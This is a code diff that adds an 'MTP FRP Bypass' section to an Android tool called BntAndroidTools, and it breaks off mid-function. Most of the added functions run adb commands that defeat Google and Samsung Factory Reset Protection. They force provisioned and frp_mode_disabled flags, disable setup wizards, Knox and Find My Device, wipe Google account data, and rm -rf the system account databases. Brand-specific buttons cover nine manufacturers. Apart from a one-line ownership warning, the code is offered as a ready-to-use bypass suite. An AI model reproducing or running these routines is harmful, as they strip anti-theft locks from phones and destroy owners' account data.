@@ -324,6 +324,7 @@ namespace BntAndroidTools
                 new[] { "ads", "  Ad Removal" },
                 new[] { "frp", "  FRP Bypass" },
                 new[] { "fastboot", "  Fastboot FRP" },
+                new[] { "mtpfrp", "  MTP FRP Bypass" },
                 new[] { "bloat", "  Bloatware" },
                 new[] { "utils", "  Device Utils" },
                 new[] { "privacy", "  Privacy Shield" },
@@ -573,6 +574,7 @@ namespace BntAndroidTools
                 case "ads": ShowAds(); break;
                 case "frp": ShowFrp(); break;
                 case "fastboot": ShowFastboot(); break;
+                case "mtpfrp": ShowMtpFrp(); break;
                 case "bloat": ShowBloat(); break;
                 case "utils": ShowUtils(); break;
                 case "privacy": ShowPrivacy(); break;
@@ -734,6 +736,8 @@ namespace BntAndroidTools
             string[][] sections = new[] {
                 new[] { "Ad Removal", "Hosts, DNS, nuclear\nDisable SDKs, banners", "ads" },
                 new[] { "FRP Bypass", "Setup wizard, accounts\nFull bypass suite", "frp" },
+                new[] { "Fastboot FRP", "Erase FRP/persist\nBootloader unlock", "fastboot" },
+                new[] { "MTP FRP Bypass", "USB mode switch, Samsung\nUniversal MTP methods", "mtpfrp" },
                 new[] { "Bloatware", "13 brands, full clean\nSearch, reinstall", "bloat" },
                 new[] { "Device Utils", "Info, reboot, backup\nScreenshot, APK install", "utils" },
                 new[] { "Privacy Shield", "Permissions, telemetry\nAudit, encrypt", "privacy" },
@@ -1345,6 +1349,813 @@ namespace BntAndroidTools
                 RunAdb("shell pm clear com.google.android.gms.auth.trustagent");
                 Log("Find My Device disabled.", Colors.Accent);
             }, "Disable Find My Device");
+        }
+
+        // =====================================================================
+        //                       MTP FRP BYPASS
+        // =====================================================================
+        private void ShowMtpFrp()
+        {
+            headerLabel.Text = "MTP FRP BYPASS - UNIVERSAL";
+            var panel = CreateSection("MTP FRP BYPASS - UNIVERSAL");
+            int y = 10;
+
+            var warn = new Label { Text = "WARNING: Only use on devices you legally own! Works via MTP/USB mode switching.", Font = new Font("Segoe UI", 8.5f, FontStyle.Bold), ForeColor = Colors.Red, Location = new Point(10, y), Width = 600, Height = 22 };
+            panel.Controls.Add(warn); y += 28;
+
+            var desc = new Label { Text = "MTP FRP bypass uses USB mode switching and file transfer protocols to bypass Google account verification.", Font = new Font("Segoe UI", 8.5f), ForeColor = Colors.TextDim, Location = new Point(10, y), Width = 600, Height = 22 };
+            panel.Controls.Add(desc); y += 28;
+
+            var sectionLabel = new Label { Text = "--- USB MODE METHODS ---", Font = new Font("Consolas", 9.5f, FontStyle.Bold), ForeColor = Colors.Orange, Location = new Point(10, y), Width = 600, Height = 22 };
+            panel.Controls.Add(sectionLabel); y += 26;
+
+            panel.Controls.Add(MakeBtn("Switch USB to MTP Mode", 10, y, 440, () => MtpSwitchMtp())); y += 38;
+            panel.Controls.Add(MakeBtn("Switch USB to PTP Mode", 10, y, 440, () => MtpSwitchPtp())); y += 38;
+            panel.Controls.Add(MakeBtn("Switch USB to RNDIS (USB Tethering)", 10, y, 440, () => MtpSwitchRndis())); y += 38;
+            panel.Controls.Add(MakeBtn("Force MTP + Disable Charging Only", 10, y, 440, () => MtpForceMtp())); y += 38;
+            panel.Controls.Add(MakeBtn("Cycle USB Modes (MTP->PTP->MTP)", 10, y, 440, () => MtpCycleUsb())); y += 38;
+
+            y += 8;
+            sectionLabel = new Label { Text = "--- SAMSUNG MTP BYPASS ---", Font = new Font("Consolas", 9.5f, FontStyle.Bold), ForeColor = Colors.Orange, Location = new Point(10, y), Width = 600, Height = 22 };
+            panel.Controls.Add(sectionLabel); y += 26;
+
+            panel.Controls.Add(MakeBtn("Samsung MTP + Smart Switch Method", 10, y, 440, () => MtpSamsungSmartSwitch())); y += 38;
+            panel.Controls.Add(MakeBtn("Samsung MTP + Odin Mode", 10, y, 440, () => MtpSamsungOdin())); y += 38;
+            panel.Controls.Add(MakeBtn("Samsung MTP + Emergency Call", 10, y, 440, () => MtpSamsungEmergency())); y += 38;
+            panel.Controls.Add(MakeBtn("Samsung MTP + Knox Reset", 10, y, 440, () => MtpSamsungKnox())); y += 38;
+            panel.Controls.Add(MakeBtn("Samsung MTP File Manager Access", 10, y, 440, () => MtpSamsungFileManager())); y += 38;
+
+            y += 8;
+            sectionLabel = new Label { Text = "--- UNIVERSAL MTP BYPASS ---", Font = new Font("Consolas", 9.5f, FontStyle.Bold), ForeColor = Colors.Orange, Location = new Point(10, y), Width = 600, Height = 22 };
+            panel.Controls.Add(sectionLabel); y += 26;
+
+            panel.Controls.Add(MakeBtn("Universal MTP FRP Reset (All Brands)", 10, y, 440, () => MtpUniversalReset())); y += 38;
+            panel.Controls.Add(MakeBtn("MTP + ADB Enable Method", 10, y, 440, () => MtpAdbEnable())); y += 38;
+            panel.Controls.Add(MakeBtn("MTP Settings Database Push", 10, y, 440, () => MtpSettingsPush())); y += 38;
+            panel.Controls.Add(MakeBtn("MTP Account Database Delete", 10, y, 440, () => MtpAccountDelete())); y += 38;
+            panel.Controls.Add(MakeBtn("MTP Provisioned Flag Reset", 10, y, 440, () => MtpProvisionedReset())); y += 38;
+            panel.Controls.Add(MakeBtn("MTP Setup Wizard Kill", 10, y, 440, () => MtpSetupWizardKill())); y += 38;
+            panel.Controls.Add(MakeBtn("MTP Google Account Clear", 10, y, 440, () => MtpGoogleAccountClear())); y += 38;
+
+            y += 8;
+            sectionLabel = new Label { Text = "--- ADVANCED MTP METHODS ---", Font = new Font("Consolas", 9.5f, FontStyle.Bold), ForeColor = Colors.Orange, Location = new Point(10, y), Width = 600, Height = 22 };
+            panel.Controls.Add(sectionLabel); y += 26;
+
+            panel.Controls.Add(MakeBtn("MTP + OTG File Push Method", 10, y, 440, () => MtpOtgPush())); y += 38;
+            panel.Controls.Add(MakeBtn("MTP + Browser Launch Method", 10, y, 440, () => MtpBrowserLaunch())); y += 38;
+            panel.Controls.Add(MakeBtn("MTP + Accessibility Exploit", 10, y, 440, () => MtpAccessibilityExploit())); y += 38;
+            panel.Controls.Add(MakeBtn("MTP + TalkBack Voice Command", 10, y, 440, () => MtpTalkBackVoice())); y += 38;
+            panel.Controls.Add(MakeBtn("Full MTP FRP Bypass (Everything)", 10, y, 440, () => MtpFullBypass())); y += 38;
+
+            y += 8;
+            sectionLabel = new Label { Text = "--- BRAND-SPECIFIC MTP ---", Font = new Font("Consolas", 9.5f, FontStyle.Bold), ForeColor = Colors.Orange, Location = new Point(10, y), Width = 600, Height = 22 };
+            panel.Controls.Add(sectionLabel); y += 26;
+
+            panel.Controls.Add(MakeBtn("Xiaomi/Redmi MTP Bypass", 10, y, 440, () => MtpXiaomiBypass())); y += 38;
+            panel.Controls.Add(MakeBtn("Huawei MTP Bypass", 10, y, 440, () => MtpHuaweiBypass())); y += 38;
+            panel.Controls.Add(MakeBtn("OPPO/Realme MTP Bypass", 10, y, 440, () => MtpOppoBypass())); y += 38;
+            panel.Controls.Add(MakeBtn("Vivo MTP Bypass", 10, y, 440, () => MtpVivoBypass())); y += 38;
+            panel.Controls.Add(MakeBtn("Motorola MTP Bypass", 10, y, 440, () => MtpMotorolaBypass())); y += 38;
+            panel.Controls.Add(MakeBtn("LG MTP Bypass", 10, y, 440, () => MtpLgBypass())); y += 38;
+            panel.Controls.Add(MakeBtn("Nokia/HMD MTP Bypass", 10, y, 440, () => MtpNokiaBypass())); y += 38;
+            panel.Controls.Add(MakeBtn("Sony/Xperia MTP Bypass", 10, y, 440, () => MtpSonyBypass())); y += 38;
+            panel.Controls.Add(MakeBtn("Asus MTP Bypass", 10, y, 440, () => MtpAsusBypass())); y += 38;
+        }
+
+        private void MtpSwitchMtp()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/3] Setting USB config to MTP...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp");
+                Log("[2/3] Setting USB function to MTP...", Colors.Orange);
+                RunAdb("shell settings put global usb_audio_routing 0");
+                RunAdb("shell am broadcast -a android.hardware.usb.action.USB_FUNCTION_CHANGED -e function mtp");
+                Log("[3/3] Restarting USB stack...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.state mtp");
+                Log("USB switched to MTP mode.", Colors.Accent);
+            }, "Switch USB to MTP");
+        }
+
+        private void MtpSwitchPtp()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/3] Setting USB config to PTP...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config ptp");
+                Log("[2/3] Setting USB function to PTP...", Colors.Orange);
+                RunAdb("shell am broadcast -a android.hardware.usb.action.USB_FUNCTION_CHANGED -e function ptp");
+                Log("[3/3] Restarting USB stack...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.state ptp");
+                Log("USB switched to PTP mode. Some devices allow FRP bypass in PTP.", Colors.Accent);
+            }, "Switch USB to PTP");
+        }
+
+        private void MtpSwitchRndis()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/3] Setting USB config to RNDIS...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config rndis,diag,serial,adb");
+                Log("[2/3] Enabling USB tethering...", Colors.Orange);
+                RunAdb("shell svc usb setFunctions rndis");
+                Log("[3/3] Restarting USB...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.state rndis,diag,serial,adb");
+                Log("USB switched to RNDIS (USB Tethering) mode.", Colors.Accent);
+            }, "Switch USB to RNDIS");
+        }
+
+        private void MtpForceMtp()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/4] Disabling charging-only mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[2/4] Force MTP function...", Colors.Orange);
+                RunAdb("shell am broadcast -a android.hardware.usb.action.USB_STATE -e configured true -e mtp true");
+                Log("[3/4] Setting USB protocol...", Colors.Orange);
+                RunAdb("shell settings put global usb_audio_routing 0");
+                RunAdb("shell settings put global adb_enabled 1");
+                Log("[4/4] Verifying...", Colors.Orange);
+                string r = RunAdb("shell getprop sys.usb.config");
+                Log("USB config: " + r, Colors.Text);
+                Log("MTP + ADB forced. Device should show as MTP in Explorer.", Colors.Accent);
+            }, "Force MTP + Disable Charging Only");
+        }
+
+        private void MtpCycleUsb()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/5] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp");
+                RunAdb("shell setprop sys.usb.state mtp");
+                Thread.Sleep(2000);
+                Log("[2/5] Switching to PTP...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config ptp");
+                RunAdb("shell setprop sys.usb.state ptp");
+                Thread.Sleep(2000);
+                Log("[3/5] Back to MTP...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp");
+                RunAdb("shell setprop sys.usb.state mtp");
+                Thread.Sleep(2000);
+                Log("[4/5] Enabling ADB...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                RunAdb("shell setprop sys.usb.state mtp,adb");
+                Log("[5/5] Cycle complete.", Colors.Orange);
+                string r = RunAdb("shell getprop sys.usb.config");
+                Log("Final USB config: " + r, Colors.Text);
+                Log("USB mode cycling completed. Reconnect device if needed.", Colors.Accent);
+            }, "Cycle USB Modes");
+        }
+
+        private void MtpSamsungSmartSwitch()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/6] Detecting Samsung device...", Colors.Orange);
+                string model = Adb.GetProp("ro.product.model");
+                string brand = Adb.GetProp("ro.product.brand");
+                Log("Device: " + brand + " " + model, Colors.Text);
+                Log("[2/6] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                RunAdb("shell setprop sys.usb.state mtp,adb");
+                Log("[3/6] Launching Smart Switch intent...", Colors.Orange);
+                RunAdb("shell am start -n com.sec.android.easyMover/com.sec.android.easyMover.activity.SmartSwitchActivity");
+                RunAdb(@"shell am start -a android.intent.action.VIEW -d ""samsung-usb://com.samsung.android.easysetup""");
+                Log("[4/6] Bypassing Samsung setup...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell pm disable-user --user 0 com.sec.android.app.SecSetupWizard");
+                Log("[5/6] Clearing Samsung FRP data...", Colors.Orange);
+                RunAdb("shell pm clear com.sec.android.app.SecSetupWizard");
+                RunAdb("shell pm clear com.samsung.android.easysetup");
+                Log("[6/6] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Samsung Smart Switch MTP method complete.", Colors.Accent);
+            }, "Samsung MTP + Smart Switch");
+        }
+
+        private void MtpSamsungOdin()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/5] Samsung Odin Mode MTP bypass...", Colors.Orange);
+                Log("[2/5] Setting USB to download mode prep...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp");
+                RunAdb("shell setprop sys.usb.state mtp");
+                Thread.Sleep(1000);
+                Log("[3/5] Bypassing FRP flags...", Colors.Orange);
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                Log("[4/5] Clearing Samsung account data...", Colors.Orange);
+                RunAdb("shell pm clear com.sec.android.app.SecSetupWizard");
+                RunAdb("shell pm clear com.samsung.android.spay");
+                RunAdb("shell pm clear com.samsung.android.samsungpass");
+                Log("[5/5] Rebooting to Odin/Download mode...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Samsung Odin MTP method complete. Reboot device.", Colors.Accent);
+            }, "Samsung MTP + Odin Mode");
+        }
+
+        private void MtpSamsungEmergency()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/5] Samsung Emergency Call + MTP bypass...", Colors.Orange);
+                Log("[2/5] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                RunAdb("shell setprop sys.usb.state mtp,adb");
+                Log("[3/5] Launching emergency dialer...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.DIAL");
+                RunAdb("shell am start -n com.android.phone/com.android.phone.EmergencyDialer");
+                Log("[4/5] Entering emergency code *#0*# ...", Colors.Orange);
+                RunAdb("shell input text '*'");
+                RunAdb("shell input text '#'");
+                RunAdb("shell input text '0'");
+                RunAdb("shell input text '*'");
+                RunAdb("shell input text '#'");
+                Log("[5/5] Enabling ADB via test mode...", Colors.Orange);
+                RunAdb("shell settings put global adb_enabled 1");
+                Log("Samsung Emergency Call method complete. Use test mode to enable ADB.", Colors.Accent);
+            }, "Samsung MTP + Emergency Call");
+        }
+
+        private void MtpSamsungKnox()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/5] Samsung Knox + MTP bypass...", Colors.Orange);
+                Log("[2/5] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/5] Disabling Knox...", Colors.Orange);
+                string[] knoxPkgs = { "com.samsung.android.knox.containeragent", "com.sec.knox.container", "com.samsung.android.knox", "com.samsung.android.knox.pushmanager", "com.samsung.android.app.routines" };
+                foreach (var p in knoxPkgs) RunAdb("shell pm disable-user --user 0 " + p);
+                Log("[4/5] Clearing FRP + Knox data...", Colors.Orange);
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell pm clear com.sec.android.app.SecSetupWizard");
+                Log("[5/5] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Samsung Knox MTP bypass complete.", Colors.Accent);
+            }, "Samsung MTP + Knox Reset");
+        }
+
+        private void MtpSamsungFileManager()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/4] Samsung MTP File Manager access...", Colors.Orange);
+                Log("[2/4] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                RunAdb("shell setprop sys.usb.state mtp,adb");
+                Log("[3/4] Launching My Files...", Colors.Orange);
+                RunAdb("shell am start -n com.sec.android.app.filemanager/com.sec.android.app.filemanager.activity.FileManagerActivity");
+                RunAdb("shell am start -n com.sec.android.app.myfiles/com.sec.android.app.myfiles.MainActivity");
+                Log("[4/4] Granting storage permissions...", Colors.Orange);
+                RunAdb("shell pm grant com.sec.android.app.myfiles android.permission.READ_EXTERNAL_STORAGE");
+                RunAdb("shell pm grant com.sec.android.app.myfiles android.permission.WRITE_EXTERNAL_STORAGE");
+                Log("Samsung File Manager opened. Browse and delete FRP files.", Colors.Accent);
+            }, "Samsung MTP File Manager");
+        }
+
+        private void MtpUniversalReset()
+        {
+            if (!Confirm("Run universal MTP FRP reset on detected device?")) return;
+            ExecuteWithWait(() =>
+            {
+                Log("[1/10] Detecting device...", Colors.Orange);
+                string brand = Adb.GetProp("ro.product.brand");
+                string model = Adb.GetProp("ro.product.model");
+                string android = Adb.GetProp("ro.build.version.release");
+                string sdk = Adb.GetProp("ro.build.version.sdk");
+                Log("Device: " + brand + " " + model + " | Android " + android + " (SDK " + sdk + ")", Colors.Text);
+                Log("[2/10] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                RunAdb("shell setprop sys.usb.state mtp,adb");
+                Log("[3/10] FRP flags...", Colors.Orange);
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                Log("[4/10] Disabling setup wizards...", Colors.Orange);
+                string[] wiz = { "com.google.android.setupwizard", "com.sec.android.app.SecSetupWizard", "com.miui.miservice", "com.huawei.android.hwfrozen", "com.oppo.setupwizard", "com.heytap.setupwizard", "com.vivo.setupwizard", "com.zte.setupwizard", "com.motorola.setupwizard" };
+                foreach (var w in wiz) RunAdb("shell pm disable-user --user 0 " + w);
+                Log("[5/10] Clearing Google account data...", Colors.Orange);
+                foreach (var c in new[] { "com.google.android.gsf.login", "com.google.android.gsf", "com.google.android.gms", "com.google.android.gms.auth", "com.google.android.gms.trust", "com.google.android.gms.fido" }) RunAdb("shell pm clear " + c);
+                Log("[6/10] Clearing account databases...", Colors.Orange);
+                RunAdb(@"shell rm -rf /data/system/users/*/accounts.db");
+                RunAdb(@"shell rm -rf /data/system/users/*/accounts_de.db");
+                RunAdb(@"shell rm -rf /data/system/users/*/accounts_ce.db");
+                Log("[7/10] Killing setup wizard processes...", Colors.Orange);
+                RunAdb("shell am force-stop com.google.android.setupwizard");
+                RunAdb("shell am force-stop com.sec.android.app.SecSetupWizard");
+                Log("[8/10] Disabling Find My Device...", Colors.Orange);
+                RunAdb("shell pm disable-user --user 0 com.google.android.gms.trust");
+                Log("[9/10] Disabling location tracking...", Colors.Orange);
+                RunAdb("shell settings put secure location_mode 0");
+                Log("[10/10] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("UNIVERSAL MTP FRP RESET COMPLETE for " + brand + " " + model + "!", Colors.Accent);
+            }, "Universal MTP FRP Reset");
+        }
+
+        private void MtpAdbEnable()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/6] MTP + ADB Enable method...", Colors.Orange);
+                Log("[2/6] Setting MTP mode first...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp");
+                RunAdb("shell setprop sys.usb.state mtp");
+                Thread.Sleep(1000);
+                Log("[3/6] Enabling ADB over MTP...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                RunAdb("shell setprop sys.usb.state mtp,adb");
+                Log("[4/6] Enabling development settings...", Colors.Orange);
+                for (int i = 0; i < 7; i++) RunAdb("shell settings put global development_settings_enabled 1");
+                RunAdb("shell settings put global adb_enabled 1");
+                Log("[5/6] Enabling USB debugging...", Colors.Orange);
+                RunAdb("shell settings put global adb_enabled 1");
+                RunAdb("shell settings put secure adb_enabled 1");
+                Log("[6/6] Verifying...", Colors.Orange);
+                string usbConfig = RunAdb("shell getprop sys.usb.config");
+                string adbEnabled = RunAdb("shell settings get global adb_enabled");
+                Log("USB config: " + usbConfig, Colors.Text);
+                Log("ADB enabled: " + adbEnabled, Colors.Text);
+                Log("MTP + ADB Enable complete. ADB should now work.", Colors.Accent);
+            }, "MTP + ADB Enable");
+        }
+
+        private void MtpSettingsPush()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/5] MTP Settings Database Push...", Colors.Orange);
+                Log("[2/5] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/5] Writing FRP bypass settings...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                RunAdb("shell settings put global development_settings_enabled 1");
+                RunAdb("shell settings put global adb_enabled 1");
+                Log("[4/5] Writing location/security settings...", Colors.Orange);
+                RunAdb("shell settings put secure location_mode 0");
+                RunAdb("shell settings put global oem_unlock_enabled 1");
+                Log("[5/5] Flushing settings cache...", Colors.Orange);
+                RunAdb("shell content call --uri content://settings/global --method GET_system --arg name");
+                Log("Settings database push complete.", Colors.Accent);
+            }, "MTP Settings Database Push");
+        }
+
+        private void MtpAccountDelete()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/6] MTP Account Database Delete...", Colors.Orange);
+                Log("[2/6] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/6] Deleting account databases...", Colors.Orange);
+                RunAdb(@"shell rm -rf /data/system/users/*/accounts.db");
+                RunAdb(@"shell rm -rf /data/system/users/*/accounts_de.db");
+                RunAdb(@"shell rm -rf /data/system/users/*/accounts_ce.db");
+                Log("[4/6] Clearing account cache...", Colors.Orange);
+                RunAdb(@"shell rm -rf /data/system/users/*/settings_secure.xml");
+                RunAdb(@"shell rm -rf /data/system/users/*/settings_system.xml");
+                RunAdb(@"shell rm -rf /data/system/users/*/settings_global.xml");
+                Log("[5/6] Clearing Google account data...", Colors.Orange);
+                foreach (var c in new[] { "com.google.android.gsf.login", "com.google.android.gsf", "com.google.android.gms", "com.google.android.gms.auth" }) RunAdb("shell pm clear " + c);
+                Log("[6/6] Verifying deletion...", Colors.Orange);
+                string accounts = RunAdb(@"shell ls /data/system/users/*/accounts.db 2>/dev/null");
+                Log("Remaining account files: " + (string.IsNullOrEmpty(accounts) ? "(none)" : accounts), Colors.Text);
+                Log("Account database delete complete.", Colors.Accent);
+            }, "MTP Account Database Delete");
+        }
+
+        private void MtpProvisionedReset()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/5] MTP Provisioned Flag Reset...", Colors.Orange);
+                Log("[2/5] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/5] Setting provisioned flags...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell content insert --uri content://settings/global --bind name:s:device_provisioned --bind value:s:1");
+                RunAdb("shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1");
+                Log("[4/5] Disabling FRP mode...", Colors.Orange);
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                RunAdb("shell content insert --uri content://settings/secure --bind name:s:frp_mode_disabled --bind value:s:1");
+                Log("[5/5] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Provisioned flags reset. Device should skip setup.", Colors.Accent);
+            }, "MTP Provisioned Flag Reset");
+        }
+
+        private void MtpSetupWizardKill()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/6] MTP Setup Wizard Kill...", Colors.Orange);
+                Log("[2/6] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/6] Disabling all setup wizards...", Colors.Orange);
+                string[] wiz = { "com.google.android.setupwizard", "com.sec.android.app.SecSetupWizard", "com.miui.miservice", "com.huawei.android.hwfrozen", "com.oppo.setupwizard", "com.heytap.setupwizard", "com.vivo.setupwizard", "com.zte.setupwizard", "com.motorola.setupwizard", "com.google.android.gsf.login" };
+                foreach (var w in wiz) RunAdb("shell pm disable-user --user 0 " + w);
+                Log("[4/6] Force-stopping wizards...", Colors.Orange);
+                foreach (var w in new[] { "com.google.android.setupwizard", "com.sec.android.app.SecSetupWizard" }) RunAdb("shell am force-stop " + w);
+                Log("[5/6] Clearing wizard data...", Colors.Orange);
+                RunAdb("shell pm clear com.google.android.setupwizard");
+                RunAdb("shell pm clear com.sec.android.app.SecSetupWizard");
+                Log("[6/6] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Setup wizard killed. Device should go to home screen.", Colors.Accent);
+            }, "MTP Setup Wizard Kill");
+        }
+
+        private void MtpGoogleAccountClear()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/7] MTP Google Account Clear...", Colors.Orange);
+                Log("[2/7] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/7] Clearing GMS login...", Colors.Orange);
+                RunAdb("shell pm clear com.google.android.gsf.login");
+                RunAdb("shell pm clear com.google.android.gsf");
+                Log("[4/7] Clearing GMS auth...", Colors.Orange);
+                RunAdb("shell pm clear com.google.android.gms");
+                RunAdb("shell pm clear com.google.android.gms.auth");
+                RunAdb("shell pm clear com.google.android.gms.auth.authzen");
+                RunAdb("shell pm clear com.google.android.gms.auth.cryptauth");
+                Log("[5/7] Clearing trust/FIDO...", Colors.Orange);
+                RunAdb("shell pm clear com.google.android.gms.trust");
+                RunAdb("shell pm clear com.google.android.gms.fido");
+                Log("[6/7] Disabling/re-enabling GMS...", Colors.Orange);
+                RunAdb("shell pm disable-user --user 0 com.google.android.gms");
+                RunAdb("shell am force-stop com.google.android.gms");
+                Thread.Sleep(2000);
+                RunAdb("shell pm enable com.google.android.gms");
+                Log("[7/7] Clearing sync data...", Colors.Orange);
+                RunAdb("shell settings delete secure sync1");
+                RunAdb("shell settings delete secure sync2");
+                Log("Google account cleared via MTP method.", Colors.Accent);
+            }, "MTP Google Account Clear");
+        }
+
+        private void MtpOtgPush()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/5] MTP + OTG File Push method...", Colors.Orange);
+                Log("[2/5] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/5] Creating FRP bypass files on device...", Colors.Orange);
+                string bypassScript = "#!/system/bin/sh\nsettings put global device_provisioned 1\nsettings put secure user_setup_complete 1\nam start -a android.intent.action.MAIN -c android.intent.category.HOME\n";
+                string tempScript = Path.Combine(Path.GetTempPath(), "bnt_frp_bypass.sh");
+                File.WriteAllText(tempScript, bypassScript);
+                RunAdb("push " + tempScript + " /sdcard/frp_bypass.sh");
+                try { File.Delete(tempScript); } catch { }
+                Log("[4/5] Executing bypass script...", Colors.Orange);
+                RunAdb("shell chmod 755 /sdcard/frp_bypass.sh");
+                RunAdb("shell sh /sdcard/frp_bypass.sh");
+                Log("[5/5] Cleaning up...", Colors.Orange);
+                RunAdb("shell rm /sdcard/frp_bypass.sh");
+                Log("MTP + OTG push method complete.", Colors.Accent);
+            }, "MTP + OTG File Push");
+        }
+
+        private void MtpBrowserLaunch()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/5] MTP + Browser Launch method...", Colors.Orange);
+                Log("[2/5] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/5] Creating browser intent file...", Colors.Orange);
+                string intentFile = Path.Combine(Path.GetTempPath(), "bnt_launch_browser.sh");
+                File.WriteAllText(intentFile, "#!/system/bin/sh\nam start -a android.intent.action.VIEW -d \"https://accounts.google.com/signin/recovery\"\nam start com.android.settings/com.android.settings.Settings\n");
+                RunAdb("push " + intentFile + " /sdcard/launch.sh");
+                try { File.Delete(intentFile); } catch { }
+                Log("[4/5] Executing browser launch...", Colors.Orange);
+                RunAdb("shell chmod 755 /sdcard/launch.sh");
+                RunAdb("shell sh /sdcard/launch.sh");
+                Log("[5/5] Opening browser for account recovery...", Colors.Orange);
+                RunAdb(@"shell am start -a android.intent.action.VIEW -d ""https://accounts.google.com/signin/recovery""");
+                Log("Browser launched. Use for Google account recovery.", Colors.Accent);
+            }, "MTP + Browser Launch");
+        }
+
+        private void MtpAccessibilityExploit()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/6] MTP + Accessibility Exploit...", Colors.Orange);
+                Log("[2/6] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/6] Enabling accessibility services...", Colors.Orange);
+                RunAdb(@"shell settings put secure enabled_accessibility_services com.google.android.marvin.talkback/com.google.android.marvin.talkback.TalkBackService");
+                RunAdb("shell settings put secure accessibility_enabled 1");
+                Log("[4/6] Opening accessibility settings...", Colors.Orange);
+                RunAdb("shell am start -a android.settings.ACCESSIBILITY_SETTINGS");
+                Log("[5/6] Launching Google app via accessibility...", Colors.Orange);
+                RunAdb("shell am start -n com.google.android.googlequicksearchbox/com.google.android.launcher.GEL");
+                Log("[6/6] Performing gesture exploit...", Colors.Orange);
+                RunAdb("shell input swipe 100 500 100 100 300");
+                RunAdb("shell input keyevent 82");
+                Log("Accessibility exploit initiated. Use TalkBack to navigate.", Colors.Accent);
+            }, "MTP + Accessibility Exploit");
+        }
+
+        private void MtpTalkBackVoice()
+        {
+            ExecuteWithWait(() =>
+            {
